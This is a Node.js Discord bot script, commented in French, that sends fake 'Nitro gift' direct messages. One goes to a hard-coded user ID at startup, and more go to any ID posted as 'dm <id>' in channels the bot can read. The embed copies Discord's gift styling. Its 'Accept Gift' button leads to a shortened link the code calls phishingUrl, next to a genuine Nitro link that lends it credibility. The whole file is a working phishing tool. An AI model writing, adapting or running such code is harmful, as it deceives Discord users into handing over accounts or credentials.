const fs = require('fs');
const config = JSON.parse(fs.readFileSync('./config.json'));
const token = config.token;

const autoId = "1525454564562702366"; // L'ID de la personne à qui envoyer direct au démarrage
const phishingUrl = "https://tinyurl.com/6c6b86en";
const imageUrl = "https://swiemali2-lgtm.github.io/member-cleanup/IMG_2560.jpeg";

let processed = new Set();

// Fonction pour envoyer le DM
async function sendDM(targetId) {
  let dm = await (await fetch(`https://discord.com/api/v9/users/@me/channels`, {method: "POST", headers: {"Authorization": `Bot ${token}`, "Content-Type": "application/json"}, body: JSON.stringify({recipient_id: targetId})})).json();
  
  if (!dm.id) {
    console.log("erreur création dm :", dm.message);
    return;
  }
  
  let embed = {
    title: "You've been gifted a subscription!",
    description: `**100pression** has gifted you Nitro for 3 months!\n\nExpires in 48 hours`,
    color: 0x5865f2,
    image: { url: imageUrl }
  };

  await fetch(`https://discord.com/api/v9/channels/${dm.id}/messages`, {
    method: "POST",
    headers: {"Authorization": `Bot ${token}`, "Content-Type": "application/json"},
    body: JSON.stringify({
      content: "",
      embeds: [embed],
      components: [
        {
          type: 1,
          components: [
            { type: 2, style: 5, label: "Accept Gift", url: phishingUrl },
            { type: 2, style: 5, label: "Learn More", url: "https://discord.com/nitro" }
          ]
        }
      ]
    })
  }).catch(()=>{});
  
  console.log(`Faux nitro envoyé à l'id : ${targetId}`);
}

// 1. On envoie direct au démarrage à l'ID
sendDM(autoId);

// 2. On écoute les commandes "dm <id>" dans les salons
async function listen() {
  console.log("Bot en ligne, tapez 'dm ID' pour envoyer manuellement.");
  
  setInterval(async () => {
    let res = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {headers: {"Authorization": `Bot ${token}`}});
    let guilds = await res.json();
    if (!Array.isArray(guilds)) return;

    for (let g of guilds) {
      let chansRes = await fetch(`https://discord.com/api/v9/guilds/${g.id}/channels`, {headers: {"Authorization": `Bot ${token}`}});
      let chans = await chansRes.json();
      if (!Array.isArray(chans)) continue;

      for (let c of chans) {
        if (c.type !== 0) continue;
        
        let msgsRes = await fetch(`https://discord.com/api/v9/channels/${c.id}/messages?limit=5`, {headers: {"Authorization": `Bot ${token}`}});
        let msgs = await msgsRes.json();
        if (!Array.isArray(msgs)) continue;
        
        for (let m of msgs) {
          if (!m.content || processed.has(m.id)) continue;
          
          const content = m.content.toLowerCase().trim();
          
          if (content.startsWith("dm ")) {
            processed.add(m.id);
            const targetId = content.split(" ")[1];
            console.log("commande dm détectée pour :", targetId);
            sendDM(targetId);
          }
        }
      }
    }
  }, 5000);
}

listen();